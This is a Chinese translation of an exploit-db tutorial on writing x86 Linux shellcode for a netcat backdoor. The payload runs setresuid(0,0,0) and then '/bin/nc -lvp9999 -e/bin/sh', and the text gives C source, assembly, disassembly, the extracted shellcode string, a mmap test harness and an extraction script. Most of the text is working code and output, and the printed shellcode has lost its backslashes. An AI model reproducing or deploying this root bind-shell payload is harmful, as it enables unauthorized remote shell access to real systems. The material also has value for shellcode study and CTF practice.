> 原文链接: https://www.anquanke.com//post/id/85216 


# 【技术文章】NC后门技术（shellcode版）


                                阅读量   
                                **115077**
                            
                        |
                        
                                                                                                                                    ![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：exploit-db.com
                                <br>原文地址：[https://www.exploit-db.com/papers/35538/](https://www.exploit-db.com/papers/35538/)

译文仅供参考，具体内容表达以及含义原文为准

**[![](https://p4.ssl.qhimg.com/t01f61595890ab9645c.gif)](https://p4.ssl.qhimg.com/t01f61595890ab9645c.gif)**

****

**翻译：**[**rac_cp******](http://bobao.360.cn/member/contribute?uid=2796348634)

**预估稿费：150RMB（不服你也来投稿啊！）**

**<strong><strong>投稿方式：发送邮件至**[**linwei#360.cn**](mailto:linwei@360.cn)**，或登陆**[**网页版**](http://bobao.360.cn/contribute/index)**在线投稿**</strong></strong>



**免责声明：小心！不要将这个程序（技术）使用在你编写的软件中，否则可能会给自己带来牢狱之灾。**

<br>

**一、引言—-什么是NetCat（瑞士军刀）**



Netcat是一个unix实用程序，它可以实现使用TCP或者UDP协议来实现网络传输数据的功能。

它设计的目的是成为一个可以直接被其他程序或脚本直接加载的“后端”执行工具。 它是一个功能丰富网络调试和探索工具，因为它可以创建几乎任何种类的连接，并且还提供了几个有趣的内置功能。 Netcat（简称为“nc”）目前已经成为unix系统自带的程序。

Netcat被认为是20大网络调试工具之一，它具备以下多种功能：

1. 连接到某个服务器

2. 作为一个后门使用

3. 传输数据

4. 几乎可以连接所有的“TCP/IP”端口

5. 其它

现如今作为一个系统管理员应该（“必须”）学习如何使用netcat来连接其他计算机等功能。在本文中，我会告诉你一个netcat shellcode，可以在软件后台打开一个端口并向外提供连接以实现后门的功能。

<br>

**二、繁琐的过程**



我作为计算机爱好者和一个软件程序员已经花了好几个星期时间来搜索如何使用netcat来做一个shellcode的后门，这是非常困难的一个过程工具，因为它是一个网络调试工具。

首先我们写两个C程序来测试shellcode：



```
#include &lt;stdio.h&gt;  //IO header
#include &lt;string.h&gt; //Functions on favor of strings
#include &lt;stdlib.h&gt; //exit() function
char shellcode[] = ""; /* Global array */
int main(int argc, char **argv)
`{`
int (*ret)(); /* ret is a func pointer*/
    ret = (int(*)())shellcode; /* ret points to our shellcode */
    (int)(*ret)();/* shellcode is type caste as a function */
    exit(0)/* exit() */
`}`
```

第二个程序是关于Mmap.c测试程序：



```
#include &lt;stdio.h&gt;//IO header
#include &lt;sys/mman.h&gt;//MMAN sys func
#include &lt;string.h&gt; //Functions on favor of strings
#include &lt;stdlib.h&gt;//Define Var types
#include &lt;unistd.h&gt;//Defines misc symbolic constants and types, and declares misc functions
int (*shellcodetotest)(); /* Global Variable type int, shellcodetotest is a func pointer */
char shellcode[] = "";/* Global array */
int main(int argc, char **argv) 
`{`
void *ptr = mmap(0, 150, PROT_EXEC | PROT_WRITE| PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);/* Mmap functions passed to *ptr pointer */
if(ptr == MAP_FAILED)  
`{`
perror("mmap");/* Func to error of program */
exit(-1);
`}`
memcpy(ptr, shellcode, sizeof(shellcode)); /* Memcpy function */
shellcodetotest = ptr;/* Here we test the shellcode with mmap functions */
shellcodetotest();/* Exec the shellcode */
return 0;/* return */
`}`
```

接下来应该做的工作是：

1. 准备一个C程序去执行nc命令

2. 测试

3. 调试

```
root@MINDZSEC:~# nano ntcat.c
```



```
#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
int main()
`{`
setresuid(0,0,0); /* Set res UID 0 0 0 to all program */
char *envp[] = `{` NULL `}`; 
char *argv[] = `{`"/bin/nc", "-lvp9999", "-e/bin/sh", NULL`}`;
int ret = execve("/bin/nc", argv, envp); /* exec the command */
`}`
```

接下来编译这个程序

```
root@MINDZSEC:~# gcc -S ntcat.c (-S switch for asm lang)
```

汇编

```
root@MINDZSEC:~# as ntcat.s -o ntcat.o
```

链接

```
root@MINDZSEC:~# ld ntcat.o -o ntcat
```

运行

```
root@MINDZSEC:~# ./ntcat
```

（其实我写的时候用的是gcc ntcat.c -o ntcat直接编译生成的，并没有照着原作者那样一步一步生成，下图中可以看到，程序运行起来后，是使用nc程序直接监听9999端口的。）

[![](https://p5.ssl.qhimg.com/t01a9f2c3f4685fb9cd.jpg)](https://p5.ssl.qhimg.com/t01a9f2c3f4685fb9cd.jpg)

反汇编程序

```
root@MINDZSEC:~# objdump -d ntcat.o
```

得到



```
ntcat.o:     file format elf32-i386
Disassembly of section .text:
00000000 &lt;main&gt;:
0:55                   push   %ebp
1:89 e5                mov    %esp,%ebp
3:83 e4 f0             and    $0xfffffff0,%esp
6:83 ec 30             sub    $0x30,%esp
9:c7 44 24 08 00 00 00 movl   $0x0,0x8(%esp)
10:00 
11:c7 44 24 04 00 00 00 movl   $0x0,0x4(%esp)
18:00 
19:c7 04 24 00 00 00 00 movl   $0x0,(%esp)
20:e8 fc ff ff ff       call   21 &lt;main+0x21&gt;
25:c7 44 24 28 00 00 00 movl   $0x0,0x28(%esp)
2c:00 
2d:c7 44 24 18 00 00 00 movl   $0x0,0x18(%esp)
34:00 
35:c7 44 24 1c 08 00 00 movl   $0x8,0x1c(%esp)
3c:00 
3d:c7 44 24 20 11 00 00 movl   $0x11,0x20(%esp)
44:00 
45:c7 44 24 24 00 00 00 movl   $0x0,0x24(%esp)
4c:00 
4d:8d 44 24 28          lea    0x28(%esp),%eax
51:89 44 24 08          mov    %eax,0x8(%esp)
55:8d 44 24 18          lea    0x18(%esp),%eax
59:89 44 24 04          mov    %eax,0x4(%esp)
5d:c7 04 24 00 00 00 00 movl   $0x0,(%esp)
64:e8 fc ff ff ff       call   65 &lt;main+0x65&gt;
69:89 44 24 2c          mov    %eax,0x2c(%esp)
6d:c9                   leave  
6e:c3                   ret
```

可以通过strace来追踪系统调用执行的情况

```
root@MINDZSEC:~# strace ./ntcat
```



```
execve("./ntcat", ["./ntcat"], [/* 31 vars */]) = 0
brk(0)                                  = 0x9966000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7764000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
fstat64(3, `{`st_mode=S_IFREG|0644, st_size=103011, ...`}`) = 0
mmap2(NULL, 103011, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb774a000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/i386-linux-gnu/i686/cmov/libc.so.6", O_RDONLY) = 3
```

可以看到第一个syscall是执行了我们的程序，接下来再去进行打开动态链接库等操作。

上面c程序生成的这段代码里面很多操作码都包括'x00'字段（NULL字段），为了生成可用的shellcode，需要记住下面的这个规则：

记住总是使用寄存器的最小部分越有可能避免null，而且xor操作是一个非常好用的gadget。

我们不需要使用这段代码去测试它，就知道这段代码直接当做shellcode是不会执行的，因为里面的操作码包括‘x00’（strcpy会截断所以执行不下去），所以我们需要退回到汇编语言去重新处理这段代码。

开始之前，需要记住以下几条：

shellcode中不能有NULL

shellcode不能使用静态地址

Xor操作是一个非常有用的gadget

现在使用汇编语言编写程序

```
root@MINDZSEC:~# nano ntcat.asm
```



```
jmp short todo
shellcode:
;from man setresuid: setresuid(uid_t ruid, uid_t euid, uid_t suid)
xor eax, eax ;Zero out eax
xor ebx, ebx;Zero out ebx
xor ecx, ecx;Zero out ecx
cdq;Zero out edx using the sign bit from eax
mov BYTE al, 0xa4 ;setresuid syscall 164 (0xa4)
int 0x80;syscall execute
pop esi;esi contain the string in db
xor eax, eax;Zero out eax
mov[esi + 7], al;null terminate /bin/nc
mov[esi +  16], al ;null terminate -lvp90
mov[esi +  26], al;null terminate -e/bin/sh
mov[esi +  27], esi;store address of /bin/nc in AAAA
lea ebx, [esi + 8];load address of -lvp90 into ebx
mov[esi +31], ebx;store address of -lvp90 in BBB taken from ebx
lea ebx, [esi + 17];load address of -e/bin/sh into  ebx
mov[esi + 35], ebx;store address of -e/bin/sh in CCCC taken from ebx
mov[esi + 39], eax ;Zero out DDDD
mov al, 11;11 is execve  syscakk number
mov ebx, esi;store address of  /bin/nc 
lea ecx, [esi + 27];load address of ptr to argv[] array
lea edx, [esi + 39] ;envp[] NULL
int 0x80;syscall execute 
todo:
call shellcode
db '/bin/nc#-lvp9999#-e/bin/sh#AAAABBBBCCCCDDDD'
;   01234567890123456789012345678901234567890123
```

在这段代码中我们做了以下操作：

1. 使用xor指令去清零eax，ebx，ecx等寄存器

2. 将命令写到了shellcode代码中了，即：



```
db '/bin/nc#-lvp9999#-e/bin/sh#AAAABBBBCCCCDDDD'
;   01234567890123456789012345678901234567890123
```

3. 在命令下面还使用了数字进行位置的注释

接下来使用nasm编译这段代码

```
root@MINDZSEC:~# nasm -f elf ntcat.asm
```

然后再用objdump反汇编

```
root@MINDZSEC:~# objdump -d ntcat.o
```

得到



```
ntcat.o:     file format elf32-i386
Disassembly of section .text:
00000000 &lt;shellcode-0x2&gt;:
0:eb 35                jmp    37 &lt;todo&gt;
00000002 &lt;shellcode&gt;:
2:31 c0                xor    %eax,%eax
4:31 db                xor    %ebx,%ebx
6:31 c9                xor    %ecx,%ecx
8:99                   cltd   
9:b0 a4                mov    $0xa4,%al
b:cd 80                int    $0x80
d:5e                   pop    %esi
e:31 c0                xor    %eax,%eax
10:88 46 07             mov    %al,0x7(%esi)
13:88 46 10             mov    %al,0x10(%esi)
16:88 46 1a             mov    %al,0x1a(%esi)
19:89 76 1b             mov    %esi,0x1b(%esi)
1c:8d 5e 08             lea    0x8(%esi),%ebx
1f:89 5e 1f             mov    %ebx,0x1f(%esi)
22:8d 5e 11             lea    0x11(%esi),%ebx
25:89 5e 23             mov    %ebx,0x23(%esi)
28:89 46 27             mov    %eax,0x27(%esi)
2b:b0 0b                mov    $0xb,%al
2d:89 f3                mov    %esi,%ebx
2f:8d 4e 1b             lea    0x1b(%esi),%ecx
32:8d 56 27             lea    0x27(%esi),%edx
35:cd 80                int    $0x80
00000037 &lt;todo&gt;:
37:e8 c6 ff ff ff       call   2 &lt;shellcode&gt;
3c:2f                   das    
3d:62 69 6e             bound  %ebp,0x6e(%ecx)
40:2f                   das    
41:6e                   outsb  %ds:(%esi),(%dx)
42:63 23                arpl   %sp,(%ebx)
44:2d 6c 76 70 39       sub    $0x3970766c,%eax
49:39 39                cmp    %edi,(%ecx)
4b:39 23                cmp    %esp,(%ebx)
4d:2d 65 2f 62 69       sub    $0x69622f65,%eax
52:6e                   outsb  %ds:(%esi),(%dx)
53:2f                   das    
54:73 68                jae    be &lt;todo+0x87&gt;
56:23 41 41             and    0x41(%ecx),%eax
59:41                   inc    %ecx
5a:41                   inc    %ecx
5b:42                   inc    %edx
5c:42                   inc    %edx
5d:42                   inc    %edx
5e:42                   inc    %edx
5f:43                   inc    %ebx
60:43                   inc    %ebx
61:43                   inc    %ebx
62:43                   inc    %ebx
63:44                   inc    %esp
64:44                   inc    %esp
65:44                   inc    %esp
66:44                   inc    %esp
```

接下来我并没有对运行这段代码进行测试，因为我百分之百肯定这段代码是可以运行的。

提取这段代码

```
root@MINDZSEC:~# ./xxd-shellcode.sh ntcat.o
```

得到shellcode

```
"xebx35x31xc0x31xdbx31xc9x99xb0xa4xcdx80x5ex31xc0x88x46x07x88x46x10x88x46x1ax89x76x1bx8dx5ex08x89x5ex1fx8dx5ex11x89x5ex23x89x46x27xb0x0bx89xf3x8dx4ex1bx8dx56x27xcdx80xe8xc6xffxffxffx2fx62x69x6ex2fx6ex63x23x2dx6cx76x70x39x39x39x39x23x2dx65x2fx62x69x6ex2fx73x68x23x41x41x41x41x42x42x42x42x43x43x43x43x44x44x44x44"
```

现在得到了shellcode，接下来要做的工作就是把这段代码放到mman.c测试程序中去运行了。放到mman.c中的程序最终如下:

```
root@MINDZSEC:~# nano Mmap.c
```



```
#include &lt;stdio.h&gt;
#include &lt;sys/mman.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
int (*shellcodetotest)();
char shellcode[] = "xebx35x31xc0x31xdbx31xc9x99xb0xa4xcdx80x5ex31xc0x88x46x07x88x46x10x88x46x1ax89x76x1bx8dx5ex08x89x5ex1fx8dx5ex11x89x5ex23x89x46x27xb0x0bx89xf3x8dx4ex1bx8dx56x27xcdx80xe8xc6xffxffxffx2fx62x69x6ex2fx6ex63x23x2dx6cx76x70x39x39x39x39x23x2dx65x2fx62x69x6ex2fx73x68x23x41x41x41x41x42x42x42x42x43x43x43x43x44x44x44x44";
int main(int argc, char **argv) `{`
void *ptr = mmap(0, 150, PROT_EXEC | PROT_WRITE| PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
if(ptr == MAP_FAILED)`{`
perror("mmap");
exit(-1);
`}`
memcpy(ptr, shellcode, sizeof(shellcode));
shellcodetotest = ptr;
shellcodetotest();
return 0;
`}`
```

编译这段代码

```
root@MINDZSEC:~# gcc Mmap.c -o Mmap
```

运行



```
oot@MINDZSEC:~# ./Mmap
listening on [any] 9999 ...
```

[![](https://p5.ssl.qhimg.com/t015d3432a67af8aa9b.png)](https://p5.ssl.qhimg.com/t015d3432a67af8aa9b.png)

（亲测有效）

可以看到程序在监听9999端口，是因为在ntcat.asm程序中使用的就是9999端口，这段汇编代码也是比较容易看懂的。当然，也还有很多方法来优化这段代码，我的技术只能到这个水平了而已，在这篇文章的基础上继续改进可以节省你很多时间。

要做netcat shellcode，仔细的阅读这篇文章，然后找到自己遇到困难的地方。在后面也会给出email以便大家遇见问题可以联系我。

整个过程中都没使用gdb是因为我认为看这篇文章的人都能够明白这整个代码。

在后面我使用了一个“xxd-shellcode.sh”文件来提取shellcode，它节省了我不少时间（5min）。下面我也把它给出来：



```
#!/bin/bash
filename=`echo $1 | sed s/".o$"//`
rm -f $filename.shellcode
objdump -d $filename.o | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr 't' ' ' | sed 's/ $//g' | sed 's/ /\x/g' | paste -d '' -s | sed 's/^/"/' | sed 's/$/"/g'
echo
```

可以测试下这个文件，当然，里面的东西是不可以修改的。这个文件你也可以在projectshellcode.com里看到。

我的昵称是MINDZSEC，我喜欢SHELLCODE。

<br>

**小结**

其实这篇文章在湖湘杯线下赛一题中可以用到的。当时湖湘杯线下赛的时候不能联网。知道问题在哪，但不晓得怎么用，试来试去都没搞出来，很蛋疼，最后都没做出来。回来以后google了一把找到了这篇文章，才把题搞出来了。歪果人还是蛮厉害的，服。不过也是自己弱，还是继续努力吧，也把它翻译出来，希望有兴趣的同学大家一起学习。最后把原文链接贴出来，翻译水平有点烂，大家有兴趣去看原文吧。
